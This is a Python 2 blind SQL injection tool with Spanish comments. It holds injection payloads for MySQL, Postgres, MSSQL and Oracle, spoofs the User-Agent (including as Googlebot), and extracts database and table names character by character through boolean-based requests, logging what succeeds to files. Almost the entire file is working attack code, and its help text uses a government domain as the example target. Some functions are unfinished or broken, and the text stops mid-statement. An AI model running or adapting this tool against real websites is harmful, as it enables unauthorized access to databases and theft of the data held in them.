#!/usr/bin/env python
#coding:utf-8
import requests
from sys import argv, exit
from HTMLParser import HTMLParser
from getopt import getopt, GetoptError
from time import sleep
from random import random
from random import randint
from random import choice
from os import getenv
from os import mkdir
from os.path import isdir
from os.path import isfile
import socks

class Injection:
	Agentes={
		'Chrome':'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
		'Google':'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
		'iExplorer':'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
		'Firefox':'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0',
		'Safari':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
		'iPhone':'Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16',
		'Android':'Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
	}

	cabeceras={}
	proxy={} #if request need a proxy for connection it will be inside this variable
	cookies = {} #if request need coookies it will be inside this variable
	datos={} # Data parameteros for Post request
	method = -1 # True = Get method # False = Post method
	server = "" #URL string
	NoAleatorio = int(random()*100)
	BDatosName=[] # List with Databases name
	ColumName=[]  # List with Columns name
	TableName=[]
	##########################################################################
	##  Variables used to store all successfull queries and data extracted  ##
	##########################################################################
	reportDir = getenv("HOME")+"/sql/"# Directory path to create all data 	##
	succesfullQuery = "succes.lol"											##
	dataXtracted = "data.data"												##
	hname= ""																##
	aData = ""																##
	fullPath = ""															##
	Dbname = {'MySQL':[],'Postgres':[],'Oracle':[],'Mssql':[]}				##
	YaExiste = False														##
	##########################################################################
	#####################################################################
	##	Variables used for reuse prefix and suffix of previous Attack  ## 
	#####################################################################
	newPrefix = ""
	newSuffix = ""
	Which = ""
	bases = []
	Flags={ ## This variable store succesfull injection queries
		'Generic':{'Prefijo':[],'Payload':[],'Sufijo':[]},
		'MySQL':{'Prefijo':[],'Payload':[],'Sufijo':[]},
		'Postgres':{'Prefijo':[],'Payload':[],'Sufijo':[]},
		'Mssql':{'Prefijo':[],'Payload':[],'Sufijo':[]},
		'Oracle':{'Prefijo':[],'Payload':[],'Sufijo':[]}
		}

	Prefijos = [" ",
				"'","''", #Simple Quotes
				"')","'))","')))", #Simple Quotes with Parentheses
				'"','""',
				'")','"))','")))',
				"%'",'%"' #Comodines
				]

	Comodin="_sqli_"

	Sufijos={
		#'MySQL':[' ','#','-- -a'," and '%'='"],
		'Generic':['--','-- -y',""],
		'MySQL':['#','-- -a',""],
		'Postgres':[';/*',';--',""],
		'Mssql':['-- -e',""],
		'Oracle':['from dual;',""]
	}

	GoodRequest=0

	PayloadsAttempt={ # Theses payloads are used in the SQLi blind detection
		'Generic':[
					  'and {0}-1={0}-1'.format(randint(2,1001)),
				      'and ascii(substring({0},1,1))={1}'.format(chr(NoAleatorio),ord(chr(NoAleatorio))),

				  ],
		'MySQL':[
					  'and ascii(substring({0},1,1))={1}'.format(chr(randint(48,126)),ord(chr(randint(48,126)))),#'and ascii(substring({0},1,1))={1}'.format(chr(int(random()*100)),ord(chr(int(random()*100)))), # Complex substring nested ascii
					  'and cast("{0}" as signed)=cast("{0}" as signed)'.format(NoAleatorio), # Easy integers conditionals
					  '&& ( select if ( cast((select floor(rand()*100)) as signed)>0,2,null) )',#'&& {0}={0}'.format(int(random()*1000)), # Easy conditionals
					  #Specific queries
					  #'&& (select @@version)',
					  'and (select database())'
					  'and (ascii(substring((select table_name FROM information_schema.tables limit 1),1,1)))>1'
					  ],
		'Postgres':[
					  'and cast({0} as int)=cast({0} as int)'.format(int(random()*1000)),'and cast({0} as integer)=cast({0} as integer)'.format(int(random()*1000)),
					  'and (select current_database())',
					  #'and (select user)',
					  'and trunc(random() * cast(random()*1291 as int) - 1)>0',
					  'and ascii(substring(@@version,1,1))=ascii("P")'
					  'and (ascii(substring((select table_name FROM information_schema.tables limit 1),1,1)))>1'
					],
		'Mssql':["and select @@version like 2008%'"],

		'Oracle':['and select @@version from dual']
				}

############################################################ Databases Names #######################################################################################################
											#####################################################################
											##  Se debe iterar el offset para recorrer registro a registro {0} ##
											##  		iterar la posicion de recorte del Caracter {1}         ##
											##			iterar el código ascii del Caracter {2}                ##
											#####################################################################
	PayloadsDBnames = {
		#'MySQL': 'and ascii(substring((select schema_name from information_schema.schemata limit 1 offset {0}),{1},1)) < {2}',
		'MySQL':"and ascii(substring((select group_concat(schema_name) from information_schema.schemata),{0},1)) < {1}",
		#'Postgres': 'and ascii(substring((select datname from pg_database limit 1 offset {0}),{1},1)) < {2}',
		'Postgres': "and ascii(substring((select array_to_string(array_agg(datname),',') from pg_database),{0},1)) < {1}",
		'Mssql': '',
		'Oracle': ''
		}
						#######################################################################
						### Variables used to determine limits for extracting database names ##
						#######################################################################

	#Length functions
	RegisterLength = {
		'MySQL': 'and (select length((select group_concat(schema_name) from information_schema.schemata))) < {0}',
		'Postgres': "and (select length((select array_to_string(array_agg(datname),',') from pg_database))) < {0}",
		'Mssql': '',
		'Oracle': ''
		}

###################################################################################################################################################################################
############################################################ Tables ###############################################################################################################
	#Length functions
	TableLength = {
		'MySQL': 'and (select length((select group_concat(table_name) from information_schema.tables where table_schema="{0}"))) < {1}',
		'Postgres': "and (select length((select array_to_string(array_agg(datname),',') from pg_database))) < {0}",
		'Mssql': '',
		'Oracle': ''
		}

	TablesName={
		'MySQL':'and ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema="{0}"),{1},1)) < {2}',
		'Postgres':'',
		'Mssql':'',
		'Oracle':''
		}
###################################################################################################################################################################################


####################################################################################################################################################################################
############################################################ Columns ###############################################################################################################
	#Length functions
	ColumnLength = {
		'MySQL': 'and (select length((select group_concat(column_name) from information_schema.columns where table_name="{0}"))) < {1}',
		'Postgres': "and (select length((select array_to_string(array_agg(datname),',') from pg_database))) < {0}",
		'Mssql': '',
		'Oracle': ''
		}

	ColumnNames={
		'MySQL':'and ascii(substring((select group_concat(column_name) from information_schema.columns where table_name="{0}"),{1},1)) < {2}',
		'Postgres':'',
		'Mssql':'',
		'Oracle':''
		}
####################################################################################################################################################################################
	#Count functions
	numRegisters = {
		'MySQL': 'and (select count(*) from information_schema.schemata) < {0}',
		'Postgres': 'and(select count(*) from pg_database) < {0}',
		'Mssql': '',
		'Oracle': ''
		}

	#Payloads to extract data

	catalogoMySQL=["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
	catalogo={
		'mysql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'postgres':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'mssql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
	}
	catalogoMySQL={
		'version':["' and   ascii(substring(@@version,1,1))","'","and   ascii(substring(@@version,","))","-- -+"],
		'tablas':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'datos ':["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
	}
	catalogoPostgres={
		'mysql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'postgres':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'mssql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
	}
	catalogoMSSQL={
		'mysql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'postgres':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'mssql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
	}
	catalogoOracle={
		'mysql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'postgres':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'mssql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
	}
	notautos=['and 1=0-- -+']
	SentHeaders = ""
	respuesta = ""
	dataTempo = {}
	####
	dnames = False
	cnames = False
	####
	todasColumnas = False
	listaColumnas=""
	####
	todasTablas = False
	listaTablas=""
	####
	todasBases = False
	listaBases = ""
	RelacionBaseTabla={}

	def __init__(self):
		self.cabeceras.update({'User-Agent':self.Agentes.get(choice(self.Agentes.keys()))})

	def searchDbname(self,Buscar):
		self.dnames = Buscar

	def setAgent(self,agent=""):
		if agent:
			self.cabeceras.update({'User-Agent':agent})
		else:
			self.cabeceras.update({'User-Agent':self.Agentes.get(choice(self.Agentes.keys()))})

	def setServer(self,server):
		self.server = server

	def setCookie(self,galleta):
		#self.cookie.update({""})
		print galleta

	def setData(self,datosPagina):
		datosPagina = datosPagina.split('&')
		for parameter in datosPagina:
			self.datos.update({parameter.split('=')[0]:parameter.split('=')[1]})

	def setMethod(self,metodo):
		if metodo == 'get':
			self.method = True
		elif metodo == 'post':
			self.method = False
		else:
			print "Method not implemented"
	def setProxy(self,proxy):
		if proxy.split("://")[0] in ["http","ftp","https"]:
			self.proxy = {proxy.split("://")[0]:proxy.split("://")[1]}
		else:
			self.proxy = self.proxy = {"http":proxy}

	def setColumns(self,columnas):
		if columnas[0]=="all":
			self.todasColumnas = True
		else:
			self.todasColumnas = False
			self.listaColumnas = columnas

	def setTables(self,tablas):
		if tablas[0] == "all":
			self.todasTablas = True
		else:
			todasTablas = False
			self.listaTablas = tablas

	def setDBname(self,dbb):
		if dbb[0] == "all":
			self.todasBases = True
		else:
			self.todasBases = False
		self.listaBases = dbb
		print ":s",self.listaBases

	def setDBMS(self,which):
		self.Which = which

	@staticmethod
	def busqueda(obj,manejador,tipo,ok,up,down,fila,columna):
		caracter = chr(Injection.getMid(up,down))
		print "up: ",up," car: ",ord(caracter)," down:",down
		coord = str(fila)+","+str(columna)
		print "Coordenada: "+coord
		consulta = requests.get(url=obj.server+manejador[tipo][1]+manejador[tipo][2]+coord+manejador[tipo][3]+"="+str(ord(caracter))+"-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
		if consulta.text == ok:
			return caracter
		elif (consulta.text != ok) and (up == down ):
			return "No encontrado"
		else:
			print " Consulta 2:"+obj.server+manejador[tipo][1]+manejador[tipo][2]+coord+manejador[tipo][3]+">"+str(ord(caracter))+"-- -+"

			consulta2 = requests.get(url=obj.server+manejador[tipo][1]+manejador[tipo][2]+coord+manejador[tipo][3]+">"+str(ord(caracter))+"-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
			if consulta2.text == ok:
				print "iguales"
				print "up: ",up," down(car): ",ord(caracter)
				print ""
				return Injection.busqueda(obj,manejador,tipo,ok,up,ord(caracter),fila,columna)
			else:
				print "up(car): ",ord(caracter)," down:",down
				print ""
				down2=down
				if (down2 + 1) == ord(caracter):
					return Injection.busqueda(obj,manejador,tipo,ok,ord(caracter)-1,down,fila,columna)
				return Injection.busqueda(obj,manejador,tipo,ok,ord(caracter),down,fila,columna)

	@staticmethod
	def getMid(up,down):
		return int(((up-down)/2) + down)

	def PostInjection(self):
		#First try MySQL queries
		if self.Which.__len__()<1:
			self.bases = ('Generic','MySQL','Postgres','Mssql','Oracle')
		else:
			self.bases = self.Which.split()
		Ftime = True
		ans = False
		self.dataTempo = self.datos.copy()
		for dbms in self.bases:
			print "="*25,"",dbms," Begin ","="*25
			for pref in self.Prefijos:
				for payl in self.PayloadsAttempt.get(dbms):
					for suf in self.Sufijos.get(dbms):
						#print self.datos
						self.dataTempo = self.datos.copy()
						#query is a dictionary which contains the payloads append to original data
						query = self.ChangePhrase(DataPost=self.dataTempo,FirsTime=Ftime,pload="{0}{1}{2}".format(pref,payl,suf))
						#sleep(0.09)
						#Attempt make a request to server with the sqli payload
						Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
						Ftime=False
						#print "".join(("{0}={1}&").format(key, value) for key, value in query.items())[:-1]
						# Imprimir Respuesta
						if Attempt.content == self.GoodRequest.content:
							#print "============== First: {0} ||| Second: {1}".format(len(Attempt.content),len(self.GoodRequest.content))
							#print Attempt.text
	#####################################	Printing succesfull queries ##########################################
							#print "Succesfull Query =>","".join(("{0}={1}&").format(key, value) for key, value in query.items())[:-1]
							#print "Succesfull Query => ",Attempt.request.body

							#After do a post request, prefix, payload and suffix will be storage in "Flags" variable
							self.Flags[dbms]['Prefijo'].append(pref)
							self.Flags[dbms]['Payload'].append(payl)
							self.Flags[dbms]['Sufijo'].append(suf)
						else:
							if "SQL syntax" in Attempt.content:
								if not ans:
									print "\t\t\t\033[1;33m Page vulnerable to SQLi, sorry but this tool only works with Blind and Time sqli Based\033[0m"
									try:
										ans = self.Continue(raw_input("\033[1;34m Do you want continue [y/N] \033[0m").lower()[0])
									except:
										ans = self.Continue("")
									if ans:
										pass
									else:
										print "Bye"
										exit(1)
	#####################################	Printing Unsuccesfull queries ##########################################							
							pass
			print "="*25,dbms," End ","="*25

# Question to user if he want to continue with attack
	def Continue(self,answer=""):
		try:
			if answer not in ('y','n'):
				answer = raw_input("\033[1;34m Do you want continue [y/N] \033[0m").lower()[0]
				self.Continue(answer)
			if answer == 'y':
				return True
			else:
				return False
		except:
			exit(1)

	# Cleaning duplicate values from Flags
	def rmDupValue(self):
		for dbms in self.bases:
			for field in ('Prefijo','Payload','Sufijo'):
				self.Flags[dbms][field] = list(set(self.Flags[dbms][field]))
	#####################################	Printing DBMS values ##########################################
	#Function used to determine DBMS
	def Whatis(self):
		tmp = 0
		for dbms in self.bases:
			tt = len(self.Flags[dbms]['Payload'])
			if  tt > tmp:
				tmp = tt
				self.Which = dbms
			elif tt == tmp:
				self.Which = "Unknown"

		if self.Which.__len__==0:
			print "Not vulnerable"
		else:
			print "DBMS detected \033[1;36m"+self.Which+"\033[0m"
			#print self.Flags
			for i in xrange(1):
				#print "\033[6;1;32mGREEN TEXT\033[0m"
				# Adding colors to Text
				try:
					ooo = "".join(("\033[1;36m"+"{0}={1}&").format(key, value) for key, value in self.datos.items())[:-1]
					uuu = "\033[1;33m{0}\033[0m\033[5;32m{1}\033[0m\033[1;33m{2}\033[0m".format(choice(self.Flags[self.Which]['Prefijo']),choice(self.Flags[self.Which]['Payload']),choice(self.Flags[self.Which]['Sufijo']))
					ooo = ooo.replace(self.Comodin,uuu)
					self.showData(ooo)
				except:
					self.showData("No vulnerable try another dbms")

	def showData(self,lll="",Previo=False):
		if Previo:
			try:
				previous = open(self.fullPath+"/"+self.succesfullQuery,"r").read()
				print "DBMS",previous.split(',')[2],"\n"
				print "-"*56
				print ":"*20,"Data Requested",":"*20
				print "-"*56
				print "\033[1;35m{0} {1} HTTP/1.1\033[0m \n".format(previous.split(',')[1],previous.split(',')[0])
				print previous.split(',')[5],"\033[0m\n"
			except:
				print "not vulnerable"
		else:
			print "-"*140
			print ":"*60,"Client Request",":"*60
			print "-"*140
			print "\033[1;35m{0} {1} HTTP/1.1\033[0m \n".format(self.GoodRequest.request.method,self.GoodRequest.request.path_url)
			for h in self.GoodRequest.request.headers: print "\033[1;35m"+h,":",self.GoodRequest.request.headers.get(h)+"\033[0m"
			print "\n",lll,"\n\033[0m"
			print "-"*140
			print ":"*60,"Server Response",":"*60
			print "-"*140
			for i in self.GoodRequest.headers: print "\033[1;35m"+i,":",self.GoodRequest.headers.get(i)+"\033[0m"
			####
			## This section will write successfull data to file
			try:
				sss = open(self.fullPath+"/"+self.succesfullQuery,"w")
																	#################################################
																	# 	Format to use when write in a file as csv 	#
																	#   url, method, dbms, prefix, sufix, request   #
																	#################################################
				sss.write("{0},{1},{2},{3},{4},{5}".format(self.GoodRequest.url.__str__(), self.GoodRequest.request.method, self.Which, choice(self.Flags[self.Which]['Prefijo']),choice(self.Flags[self.Which]['Sufijo']),lll))
				sss.close()
			except:
				print "Failed to write data in file"


	#Function used to replace value of variable Comodin (passphrase) with queries to detect a sqli
	def ChangePhrase(self,DataPost="",pload="",FirsTime=False,cAscii=0,offset=0,pos=0,dname=False,cant=False,longi=False,tname=False,nombreBase=""):
		if FirsTime:
			#print "Primera vez ;)"
			lol = self.datos.copy()
			for param in lol.keys():
				if self.Comodin in lol.get(param):
					lol[param] = lol.get(param).replace(self.Comodin,"")
			self.GoodRequest = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=lol,proxies=self.proxy)
			#print "Original Request",lol
			#sleep(0.2)
		# Solo sustituye el valor para la cantidad de registros
		# if cant:
		# 	for parametro in DataPost.keys():
		# 		if self.Comodin in DataPost.get(parametro):
		# 			DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload).format(cAscii)
		# 	return DataPost
		# Solo sustituye la longitud de un registro
		if longi:
			if tname:   # Longitud de la cadena concatenada de las tablas
				for parametro in DataPost.keys():
					if self.Comodin in DataPost.get(parametro):
						DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload).format(nombreBase,cAscii)
				return DataPost
			else:
				for parametro in DataPost.keys():
					if self.Comodin in DataPost.get(parametro):
						DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload).format(cAscii)
				return DataPost
		# Sustituye el valor para de cada registros, la posición que va recorriendo de la cadena y su código ascii
		if dname:
			for parametro in DataPost.keys():
				if self.Comodin in DataPost.get(parametro):
					DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload).format(pos,cAscii)
			#print "ñ.ñ",DataPost
			return DataPost
		#Sustituyendo para extraer el nombre de la base de datos
		if tname:
			for parametro in DataPost.keys():
				if self.Comodin in DataPost.get(parametro):
					DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload).format(nombreBase,pos,cAscii)
			return DataPost
		else:
			for parametro in DataPost.keys():
				if self.Comodin in DataPost.get(parametro):
					DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload)
			return DataPost

								#######################################
								## Hard methods to get database name ##
								##			  using 'and'			 ##
								#######################################

	def getDelimiters(self):
		try:
			#First we extract prefix and suffix storage in a text file used on previous information gathering
			fSuccess = open(self.fullPath+"/"+self.succesfullQuery,"r").read()
			self.Which = fSuccess.split(',')[2]
			self.newPrefix = fSuccess.split(',')[3]
			self.newSuffix = fSuccess.split(',')[4]
			#for i in range(10): print self.Which+" ::: "+self.PayloadsDBnames[self.Which].format(i)
		except:
			print "Target not vulnerable"
			exit(1)

										#####################
										## Guessing limits ##
										#####################

	def CantidadRegistros(self):
		liminf = 0
		limsup = 40
		medio = (liminf + limsup)//2
		found = False
		while True:
			self.dataTempo = self.datos.copy()
			query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,self.numRegisters.get(self.Which),self.newSuffix),cant=True,cAscii=medio)
			Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
			#print query
			#sleep(0.5)
			if found:
				break
			if Attempt.content == self.GoodRequest.content:
				#print "Menor"
				liminf = liminf
				limsup = medio
				medio = (liminf + limsup)//2
			elif not(Attempt.content == self.GoodRequest.content):
				#print "Mayor"
				liminf = medio
				limsup = limsup
				medio = (liminf + limsup)//2
			if limsup-1-liminf==0:
				found = True
			#sleep(0.3)
		return medio

	def LongitudRegistro(self,nr=0,lsup=200,tipo="",nbase=""):
			liminf = 0
			limsup = lsup
			medio = (liminf + limsup)//2
			found = False
			kind = tipo
			while True:
				#print "kind",kind
				self.dataTempo = self.datos.copy()
				if kind== "base":
					query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,self.RegisterLength.get(self.Which),self.newSuffix),longi=True,cAscii=medio)
				elif kind== "tablas":
					query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,self.TableLength.get(self.Which),self.newSuffix),longi=True,tname=True,nombreBase=nbase,cAscii=medio)
				elif kind== "columna":
					query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,self.RegisterLength.get(self.Which),self.newSuffix),longi=True,cname=True,nombreBase=nbase,cAscii=medio)
				#print "Length ::::",query
				#sleep(0.5)
				#print "Medio:",medio
				AttemptLongi = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
				if found:
					#print "Found",medio
					return medio
					#break
				if AttemptLongi.content == self.GoodRequest.content:
					liminf = liminf
					limsup = medio
					medio = (liminf + limsup)//2
				elif not(AttemptLongi.content == self.GoodRequest.content):
					liminf = medio
					limsup = limsup
					medio = (liminf + limsup)//2
				if limsup-1-liminf==0:
					found = True

	def getPostDBnames(self):
		letra = ""
		letter = ""
		print "\n"*3
		print "="*25
		print "="*3,"Guessing DB Names","="*3
		print "="*25
		tamanioRegistro = self.LongitudRegistro(lsup=3000,tipo="base")
		letter = ""
		for posicion in xrange(1,tamanioRegistro+1):
			liminf = 31 #48 because is number 0
			limsup = 127
			medio = (liminf + limsup)//2
			found = False
			while True:
				self.dataTempo = self.datos.copy()
				query = self.ChangePhrase(DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,self.PayloadsDBnames.get(self.Which),self.newSuffix),dname=True,pos=posicion,cAscii=medio)
				Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
				if found:
					letter+=chr(medio)
					break
				if self.GoodRequest.content==Attempt.text:
					liminf = liminf
					limsup = medio
					medio = (liminf + limsup)//2
				elif not(Attempt.content == self.GoodRequest.content):
					liminf = medio
					limsup = limsup
					medio = (liminf + limsup)//2
				if (limsup-liminf)-1==0:
					found = True
		self.BDatosName = letter.split(',')
		print self.BDatosName

	def getPostTables(self):
		letra = ""
		letter = ""
		print "\n"*3
		print "="*28
		print "="*3,"Guessing Tables Name","="*3
		print "="*28
		#sleep(3)
		if self.todasBases: #Cuando el usuario escribio all
			#for ldbname in self.listaBases:
			for ldbname in self.BDatosName:
				#print ldbname
				letter = ""
				tamanioRegistro = self.LongitudRegistro(lsup=300000,tipo="tablas",nbase=ldbname)
				print tamanioRegistro
				for posicion in xrange(1,tamanioRegistro+1):
					liminf = 31 #48 because is number 0
					limsup = 127
					medio = (liminf + limsup)//2
					found = False
					while True:
						self.dataTempo = self.datos.copy()
						query = self.ChangePhrase(DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,self.TablesName.get(self.Which),self.newSuffix),tname=True,nombreBase=ldbname,pos=posicion,cAscii=medio)
						#print query
						#sleep(0.4)
						Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
						if found:
							letter+=chr(medio)
							break
						if self.GoodRequest.content==Attempt.text:
							liminf = liminf
							limsup = medio
							medio = (liminf + limsup)//2
						elif not(Attempt.content == self.GoodRequest.content):
							liminf = medio
							limsup = limsup
							medio = (liminf + limsup)//2
						if (limsup-liminf)-1==0:
							found = True
		else:# Cuando el usuario escribe las bases de datos
			for ldbname in self.listaBases:
				#print ldbname
				letter = ""
				tamanioRegistro = self.LongitudRegistro(lsup=3000,tipo="tablas",nbase=ldbname)
				print tamanioRegistro
				for posicion in xrange(1,tamanioRegistro+1):
					liminf = 31 #48 because is number 0
					limsup = 127
					medio = (liminf + limsup)//2
					found = False
					while True:
						self.dataTempo = self.datos.copy()
						query = self.ChangePhrase(DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,self.TablesName.get(self.Which),self.newSuffix),tname=True,nombreBase=ldbname,pos=posicion,cAscii=medio)
						#print query
						#sleep(0.4)
						Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
						if found:
							letter+=chr(medio)
							break
						if self.GoodRequest.content==Attempt.text:
							liminf = liminf
							limsup = medio
							medio = (liminf + limsup)//2
						elif not(Attempt.content == self.GoodRequest.content):
							liminf = medio
							limsup = limsup
							medio = (liminf + limsup)//2
						if (limsup-liminf)-1==0:
							found = True
				#print ldbname,"=>",letter.split(',')
				self.RelacionBaseTabla[ldbname]=letter.split(',')
			print "TABLAS",self.RelacionBaseTabla

	def getPostColumns():
		letra = ""
		letter = ""
		print "\n"*3
		print "="*20
		print "="*3,"Getting Columns Name","="*3
		print "="*20
		sleep(3)
		if self.todasColumnas: #Cuando el usuario escribio all
			for ldbname in self.BDatosName:
				pass
		else:
			for lcname in self.listaColumnas:
				pass


	def Begin(self):
		print "(>¬.¬)>\n"+"="*20
		#sleep(1)
		if self.method:#GET
			pagina = requests.get(url=self.server,cookies=self.cookies,headers=self.cabeceras,proxies=self.proxy)
			print "pagina "+pagina.text
			for tauto in self.notautos:
				print "Query ",tauto
				tautosidad = requests.get(url=self.server+"' and 1=0 -- -+", cookies=self.cookies, headers=self.cabeceras, proxies=self.proxy)
				tautosidad2 = requests.get(url=self.server+"' and 1=1 -- -+", cookies=self.cookies, headers=self.cabeceras, proxies=self.proxy)
				print tautosidad.text
				print tautosidad2.text
				if (tautosidad.text != pagina.text and tautosidad2.text == pagina.text):
					PGSQLoMySQL = requests.get(url=self.server+"' union select @@version -- -+", cookies=self.cookies, headers=self.cabeceras, proxies=self.proxy)
#					print "!",PGSQLoMySQL.text," !! ",pagina.text
					if PGSQLoMySQL.text == pagina.text:
						MSSQLoMySQL = requests.get(url=self.server+"' and True -- -+", cookies=self.cookies, headers=self.cabeceras, proxies=self.proxy)
						if MSSQLoMySQL.text == pagina.text:
							database = "mysql"
							print "Base de datos detectada: ",database
							char = ""
							version = ""
							indiceY = 1
							while char != "No encontrado":
								char =self.busqueda(self,self.catalogoMySQL,"version",pagina.text,126,32,indiceY,1)
								print "Caracter: "+char
								if char != "No encontrado":
									version += char
									indiceY = indiceY +1
							print "Version: "+version
							
						else:
							database = "mssql"
							print "Base de datos detectada: ",database
					else:
#						select tablename from pg_tables;
						database = "postgres"
						print "Base de datos detectada: ",database
					for query in self.catalogo.get(database):		
						ciego = requests.get(url=self.server+query,cookies=self.cookies,headers=self.cabeceras,proxies=self.proxy)
				
						if ciego == pagina:
							print query + " ! " + ciego.text + " ! iguales"
						else:
							print query + " ! " + ciego.text + " ! no iguales"
				else:
					print "Página no vulnerable"
		#POST Method
		else:
			if not self.YaExiste: # If not exists records of scanning
				#POST Requests
				self.PostInjection()
				# Remove Duplicate values
				self.rmDupValue()
				#Identify DB and show data injection if exists
				self.Whatis()
				# Set a conditional to validate an existing log file generated previously
				if self.dnames:
					self.getDelimiters()
					self.getPostDBnames()
					self.getPostTables()
				else: exit(1)
			else: # If a scanning was previously did it
				self.showData(Previo=True)
				if self.dnames:
					self.getDelimiters()
					self.getPostDBnames()
					self.getPostTables()
				#print "Ya se hizo un escaneo previo"
				exit(1)

	def CreateFiles(self):
		self.hname = self.server.split("/")[2]
		self.aData = self.server.split("/")[3]
		self.fullPath = self.reportDir+""+self.hname+"/"+self.aData
		print self.fullPath
		#########################################################################
		##  First, we check if exists files previously generated by the tools  ##
		#########################################################################
		if isdir(self.reportDir+""+self.hname):
			pass
		else:
			try:
				mkdir(self.reportDir+""+self.hname)
			except:
				#print "File "+self.hname+" Already exists"
				pass
		if isdir(self.fullPath):
			pass
		else:
			try:
				mkdir(self.fullPath)
			except:
				#print "File "+self.aData+" Already exists"
				pass
		if isfile(self.fullPath+"/"+self.succesfullQuery) and isfile(self.fullPath+"/"+self.dataXtracted):
			self.YaExiste = True
		else:
			try:
				f = open(self.fullPath+"/"+self.succesfullQuery,"a").close()
				f = open(self.fullPath+"/"+self.dataXtracted,"a").close()
			except:
				pass
				#print "Logs already exists"

def Opciones(argv):
	try:
		opciones, argumentos = getopt(argv[1:],"ho:v",["request=","cookie=","user-agent=","method=","random-agent","data=","proxy=","columns=","tables=","server=",'dbname=','db'])
	except GetoptError:
		print """### Ayuda ###\n{0} --request=<http://www.example.gob.mx> --user-agent=<example/2.1>""".format(argv[0])
		exit(2)
	for opt, vals in opciones:
		#Ayuda
		if opt in ('-h','--help'):
			print '{0} --request=<http://www.example.gob.mx> --user-agent=<example/2.1>'.format(argv[0])
		#Server
		elif opt in ('--request'):
			#print "{0} -> {1}".format(opt,vals)
			inject.setServer(vals)
		#User-Agent
		elif opt in ('--user-agent'):
			inject.setAgent(vals)
			#print "{0} -> {1}".format(opt,vals)
		elif opt in ('--cookie'):
			inject.setCookie(vals)
		elif opt in ('--data'):
			inject.setData(vals)
		#User-Agent Random
		elif opt == '--random-agent':
			inject.setAgent("")
		elif opt == '--dbname':
			try:
				ddd = vals.split(',')
			except:
				ddd="all"
			inject.setDBname(ddd)
		elif opt == '--db':
			inject.searchDbname(True)
		#Proxy params
		elif opt == '--proxy':
			inject.setProxy(vals)
		elif opt == '--server':
			if vals not in ('Generic','MySQL','Postgres','Mssql','Oracle'):
				print '<{0} --request=<http://www.example.gob.mx> --user-agent=<example/2.1>'.format(argv[0])
				print "You must insert some DBs strings: "+" ,".join(('Generic','MySQL','Postgres','Mssql','Oracle'))
				exit(1)
			inject.setDBMS(vals)
		#Get table specified
		elif opt == '--tables':
			try:
				tbles = vals.split(',')
			except:
				tbles="all"
			inject.setTables(tbles)
		#Get column specified
		elif opt == '--columns':
			try:
				clumns = vals.split(',')
			except:
				clumns="all"
			inject.setColumns(clumns)
		#Option not valid
		elif opt == '--method':
			if vals in ('get','post'):
				inject.setMethod(vals)
			else:
				print "Method not implemented"
				exit(1)
		else:
			print '<{0} --request=<http://www.example.gob.mx> --user-agent=<example/2.1>'.format(argv[0])
			exit(1)
	else:
		main()



def main():
	# Create Directory and Files used for reporting
	inject.CreateFiles()
	inject.Begin()

if __name__ == "__main__":
	if isdir(getenv("HOME")+"/sql/"):
		pass
	else:
		try:
